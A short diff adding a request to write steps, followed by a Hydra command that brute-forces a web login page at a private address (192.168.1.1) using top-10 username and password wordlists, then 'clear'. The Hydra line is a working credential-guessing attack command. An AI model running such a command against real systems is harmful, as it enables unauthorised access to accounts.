@@ -1,0 +1,4 @@
+I want to write the following steps by steps.
+
+1. hydra http://[192.168.1.1]/login.html -e ns -F -V -t 4 -L Desktop/top_10_usernames.txt -p Desktop/top_10_passwords.txt
+2. clear 
